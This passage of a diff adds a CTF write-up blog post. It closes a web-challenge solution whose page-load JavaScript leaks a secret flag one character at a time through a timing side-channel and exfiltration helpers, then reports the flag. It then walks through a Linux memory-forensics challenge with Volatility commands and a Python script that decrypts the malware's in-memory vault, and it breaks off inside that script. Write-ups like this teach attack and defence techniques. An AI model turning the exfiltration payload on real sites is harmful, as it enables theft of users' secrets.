+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">alphabet</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">nextAlphabet</span>(<span style="color:#a6e22e">KNOWN</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">alphabet</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">===</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfilQS</span>({ <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">KNOWN</span>, <span style="color:#a6e22e">extra</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;nothing-to-do&#39;</span>, <span style="color:#a6e22e">t</span><span style="color:#f92672">:</span> Date.<span style="color:#a6e22e">now</span>() });
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">exfilQS</span>({ <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">KNOWN</span>, <span style="color:#a6e22e">extra</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;start&#39;</span>, <span style="color:#a6e22e">t</span><span style="color:#f92672">:</span> Date.<span style="color:#a6e22e">now</span>() });
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;known=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">KNOWN</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;alphabet=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">alphabet</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;&#39;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">results</span> <span style="color:#f92672">=</span> [];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Round-robin would be okay, but fully sequential is simplest and most stable.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">ch</span> <span style="color:#66d9ef">of</span> <span style="color:#a6e22e">alphabet</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">measureCandidate</span>(<span style="color:#a6e22e">KNOWN</span>, <span style="color:#a6e22e">ch</span>, <span style="color:#a6e22e">REPS</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">results</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">r</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfilQS</span>({
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">KNOWN</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">extra</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`cand:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">ch</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:med:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">med</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">1</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">:samples:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">r</span>.<span style="color:#a6e22e">samples</span>.<span style="color:#a6e22e">map</span>(<span style="color:#a6e22e">x</span> =&gt; <span style="color:#a6e22e">x</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">1</span>)).<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;,&#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">t</span><span style="color:#f92672">:</span> Date.<span style="color:#a6e22e">now</span>()
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">results</span>.<span style="color:#a6e22e">sort</span>((<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) =&gt; <span style="color:#a6e22e">b</span>.<span style="color:#a6e22e">med</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">a</span>.<span style="color:#a6e22e">med</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">best</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">results</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">second</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">results</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">||</span> <span style="color:#66d9ef">null</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">margin</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">second</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">med</span> <span style="color:#f92672">-</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">med</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">med</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">summary</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">known</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">KNOWN</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">best</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">ch</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">bestMedian</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">med</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">second</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">second</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">ch</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">secondMedian</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">second</span> <span style="color:#f92672">?</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">med</span> <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">margin</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">results</span>
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;best=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">ch</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; med=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">med</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">second</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;second=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">ch</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; med=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">second</span>.<span style="color:#a6e22e">med</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;margin=&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">margin</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">1</span>));
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Query-string summary
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">exfilQS</span>({
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">KNOWN</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">ch</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">extra</span><span style="color:#f92672">:</span> <span style="color:#e6db74">`winner:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">best</span>.<span style="color:#a6e22e">ch</span><span style="color:#e6db74">}</span><span style="color:#e6db74">:margin:</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">margin</span>.<span style="color:#a6e22e">toFixed</span>(<span style="color:#ae81ff">1</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">t</span><span style="color:#f92672">:</span> Date.<span style="color:#a6e22e">now</span>()
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Full raw data
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">exfilJSON</span>(<span style="color:#a6e22e">summary</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;load&#39;</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">main</span>().<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">err</span> =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;ERROR &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">message</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfilQS</span>({
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">flag</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">KNOWN</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">extra</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;error:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">message</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">t</span><span style="color:#f92672">:</span> Date.<span style="color:#a6e22e">now</span>()
+</span></span><span style="display:flex;"><span>    });
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exfilJSON</span>({ <span style="color:#a6e22e">known</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">KNOWN</span>, <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">message</span> });
+</span></span><span style="display:flex;"><span>  });
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/body&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/html&gt;</span>
+</span></span></code></pre></div><p>And the flag was <code>CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f6cc2da658}</code>. Took me about two hours to exfil the whole thing.</p>
+<h2 id="ram-vault-beacon-malware">RAM Vault Beacon Malware<a hidden class="anchor" aria-hidden="true" href="#ram-vault-beacon-malware">#</a></h2>
+<p>This was a linux malware memory forensics. Basically after the malware ran, it generated some parameters, derived a cryptographic key based on them and encrypted a <em>vault</em> in the memory. So we needed to decrypt this RAM blob inside the ram.</p>
+<p>I had to install this specific linux image for volatility to run it, so there was a bunch of broken installation on kali that came with this challenge which was pretty annoying.</p>
+<p>I dumped the pslist with <code>python3 vol.py -f ../virus/memory.lime linux.pslist</code> and found the fishy python one to sniff around, with the PID 27316, and the <code>/opt/ctf_vault/ram_vault_beacon</code>. This used the <code>/etc/machine-id</code> file which I tried to recover with <code>python3 vol.py -f ../virus/memory.lime -o recovered linux.pagecache.RecoverFs</code> but everything important just seemed empty.</p>
+<p>The only thing we still had was the <code>ram_vault_beacon</code> binary, which handled all the encryption. Then, using <code>inux.vmaregexscan.VmaRegExScan --pid 27316</code> we recovered the following:</p>
+<ul>
+<li>
+<p><code>TASK_ID=1bcec366-9649-4a61-8c2d-9c6b2c2a702a</code></p>
+</li>
+<li>
+<p><code>KDF_SALT=d17025e353b5380823b9eef194ef33ad</code></p>
+</li>
+<li>
+<p><code>STAGE_ARGS_B64=TRVnDl1dSQDmaFZohHQdYe0nqpAS+w9qgphZ9rBC7gARGbEalpjyTCw+o/KopwZzIg4OQ8W/3m7tuiOy7/74AgA=</code></p>
+</li>
+</ul>
+<p>Then, the machine-id was recoverable from the cache in the memory dump. Running <code>python3 vol.py -f ../virus/memory.lime linux.pagecache.Files 2&gt;/dev/null | grep -i &quot;machine-id&quot;</code> showed us that it had the inode <code>0x89aa0b142f68</code> with a 33 byte size. Then, to get its page address, I ran <code>python3 vol.py -f ../virus/memory.lime linux.pagecache.InodePages --inode 0x89aa0b142f68</code> and got <code>0x10ac4e000</code>.</p>
+<p>Then, to finally get the machine-id, I ran this script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 - <span style="color:#e6db74">&lt;&lt; &#39;FUFU&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">import struct
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">path = &#34;/home/kali/Downloads/virus/memory.lime&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LIME_MAGIC = 0x4C694D45
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">HDR_SIZE = 32
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">target_phys = 0x10ac4e000
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">with open(path, &#34;rb&#34;) as f:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    while True:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        hdr = f.read(HDR_SIZE)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        if len(hdr) &lt; HDR_SIZE:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            break
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        magic, ver, start, end = struct.unpack_from(&#34;&lt;IIQQ&#34;, hdr)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        if magic != LIME_MAGIC:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            break
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        size = end - start + 1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        data_offset = f.tell()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        if start &lt;= target_phys &lt;= end:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            off_in_range = target_phys - start
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            f.seek(data_offset + off_in_range)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            data = f.read(64)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            print(f&#34;Found in range 0x{start:x}-0x{end:x}&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            print(f&#34;Raw bytes: {data[:33]}&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            print(f&#34;As string: {data[:33].decode(errors=&#39;replace&#39;).strip()}&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">            break
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        f.seek(size, 1)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">FUFU</span>
+</span></span></code></pre></div><p>Which just fetched the 33 bytes that were at that page address, and got us the machine-id as <code>783abf8dcd8846d889fee75ae6b1046a</code>.</p>
+<p>We also needed the <code>ts_window</code>. The malware ran for about 10 minutes, so we took the possible timestamps in little-endian and only found <code>1772107800</code> (which was 2026-02-26 12:10:00 UTC).</p>
+<p>The vault could be identified by its header, <code>03 00 00 00 18 00 00 00 20 00 00 00 30 00 00 00</code>. These values represented version (3), nonce_len (24), pt_len (32, plaintext length) and ct_len (48).</p>
+<p>So the malware, on execution, created the <code>TASK_ID</code>, <code>KDF_SALT</code> and <code>STATE_ARGS_B64</code>. Then, it read the machine-id and derived a key based on all of these and the time stamp. Using these, it created the vault, with the XChaCha20-Poly1305 algorithm.</p>
+<p>So <em>FINALLY</em> we have all the pieces we need, we can run this script and finish this challenge once and for all:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> ctypes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Live values from PID 27316</span>
+</span></span><span style="display:flex;"><span>machine_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;783abf8dcd8846d889fee75ae6b1046a&#34;</span>
+</span></span><span style="display:flex;"><span>task_id <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1bcec366-9649-4a61-8c2d-9c6b2c2a702a&#34;</span>
+</span></span><span style="display:flex;"><span>kdf_salt_ascii <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;d17025e353b5380823b9eef194ef33ad&#34;</span>
+</span></span><span style="display:flex;"><span>kdf_salt_raw <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(kdf_salt_ascii<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>stage_b64 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;TRVnDl1dSQDmaFZohHQdYe0nqpAS+w9qgphZ9rBC7gARGbEalpjyTCw+o/KopwZzIg4OQ8W/3m7tuiOy7/74AgA=&#34;</span>
+</span></span><span style="display:flex;"><span>stage_raw <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(stage_b64)
+</span></span><span style="display:flex;"><span>ts_window <span style="color:#f92672">=</span> <span style="color:#ae81ff">1772107800</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;0300000018000000200000003000000065a0ba42&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;31030b3e2b7319e203f7b08bc5ef18373acaf006e7c8e6f7&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;d2b5f03f0ef3b753095f21cc1924e1c8c21072aff814b697&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;3d980614b0ea1074f269b3c9b17ecc48dd3c054b2932f839&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nonce <span style="color:#f92672">=</span> blob[<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">44</span>]
+</span></span><span style="display:flex;"><span>ct <span style="color:#f92672">=</span> blob[<span style="color:#ae81ff">44</span>:<span style="color:#ae81ff">92</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lib <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>cdll<span style="color:#f92672">.</span>LoadLibrary(<span style="color:#e6db74">&#34;libsodium.so.23&#34;</span>)
+</span></span><span style="display:flex;"><span>lib<span style="color:#f92672">.</span>sodium_init()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>decrypt_fn <span style="color:#f92672">=</span> lib<span style="color:#f92672">.</span>crypto_aead_xchacha20poly1305_ietf_decrypt
+</span></span><span style="display:flex;"><span>decrypt_fn<span style="color:#f92672">.</span>argtypes <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    ctypes<span style="color:#f92672">.</span>c_void_p, ctypes<span style="color:#f92672">.</span>POINTER(ctypes<span style="color:#f92672">.</span>c_ulonglong), ctypes<span style="color:#f92672">.</span>c_void_p,
+</span></span><span style="display:flex;"><span>    ctypes<span style="color:#f92672">.</span>c_void_p, ctypes<span style="color:#f92672">.</span>c_ulonglong,
+</span></span><span style="display:flex;"><span>    ctypes<span style="color:#f92672">.</span>c_void_p, ctypes<span style="color:#f92672">.</span>c_ulonglong,
+</span></span><span style="display:flex;"><span>    ctypes<span style="color:#f92672">.</span>c_void_p, ctypes<span style="color:#f92672">.</span>c_void_p
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>decrypt_fn<span style="color:#f92672">.</span>restype <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_int
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dec</span>(key: bytes, aad: bytes):
+</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>create_string_buffer(<span style="color:#ae81ff">128</span>)
+</span></span><span style="display:flex;"><span>    out_len <span style="color:#f92672">=</span> ctypes<span style="color:#f92672">.</span>c_ulonglong(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>    rc <span style="color:#f92672">=</span> decrypt_fn(
+</span></span><span style="display:flex;"><span>        out, ctypes<span style="color:#f92672">.</span>byref(out_len), <span style="color:#66d9ef">None</span>,
+</span></span><span style="display:flex;"><span>        ctypes<span style="color:#f92672">.</span>create_string_buffer(ct, len(ct)), len(ct),
+</span></span><span style="display:flex;"><span>        ctypes<span style="color:#f92672">.</span>create_string_buffer(aad, len(aad)), len(aad),
+</span></span><span style="display:flex;"><span>        ctypes<span style="color:#f92672">.</span>create_string_buffer(nonce, len(nonce)),
+</span></span><span style="display:flex;"><span>        ctypes<span style="color:#f92672">.</span>create_string_buffer(key, len(key)),
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> rc <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> out<span style="color:#f92672">.</span>raw[:out_len<span style="color:#f92672">.</span>value]
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ts_le <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;Q&#34;</span>, ts_window)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># plausible variants from reversing</span>
+</span></span><span style="display:flex;"><span>stage_hash_b64 <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(stage_b64)<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>stage_hash_raw <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(stage_raw)<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>salt_hash_ascii <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(kdf_salt_ascii)<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>aad_variants <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;aad_mid_task&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(machine_id <span style="color:#f92672">+</span> task_id)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;aad_task_mid&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(task_id <span style="color:#f92672">+</span> machine_id)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;aad_mid&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(machine_id)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;aad_task&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(task_id)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;aad_none&#34;</span>: <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key_variants <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;k1&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(kdf_salt_raw <span style="color:#f92672">+</span> hashlib<span style="color:#f92672">.</span>sha256(machine_id <span style="color:#f92672">+</span> task_id <span style="color:#f92672">+</span> ts_le <span style="color:#f92672">+</span> stage_hash_b64)<span style="color:#f92672">.</span>digest() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;rocsc/vault&#34;</span>)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;k2&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(kdf_salt_raw <span style="color:#f92672">+</span> hashlib<span style="color:#f92672">.</span>sha256(machine_id <span style="color:#f92672">+</span> task_id <span style="color:#f92672">+</span> ts_le <span style="color:#f92672">+</span> stage_hash_raw)<span style="color:#f92672">.</span>digest() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;rocsc/vault&#34;</span>)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;k3&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(kdf_salt_raw <span style="color:#f92672">+</span> hashlib<span style="color:#f92672">.</span>sha256(task_id <span style="color:#f92672">+</span> machine_id <span style="color:#f92672">+</span> ts_le <span style="color:#f92672">+</span> stage_hash_b64)<span style="color:#f92672">.</span>digest() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;rocsc/vault&#34;</span>)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;k4&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(kdf_salt_raw <span style="color:#f92672">+</span> hashlib<span style="color:#f92672">.</span>sha256(machine_id <span style="color:#f92672">+</span> ts_le <span style="color:#f92672">+</span> task_id <span style="color:#f92672">+</span> stage_hash_b64)<span style="color:#f92672">.</span>digest() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;rocsc/vault&#34;</span>)<span style="color:#f92672">.</span>digest(),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;k5&#34;</span>: hashlib<span style="color:#f92672">.</span>sha256(salt_hash_ascii <span style="color:#f92672">+</span> hashlib<span style="color:#f92672">.</span>sha256(machine_id <span style="color:#f92672">+</span> task_id <span style="color:#f92672">+</span> ts_le <span style="color:#f92672">+</span> stage_hash_b64)<span style="color:#f92672">.</span>digest() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;rocsc/vault&#34;</span>)<span style="color:#f92672">.</span>digest(),
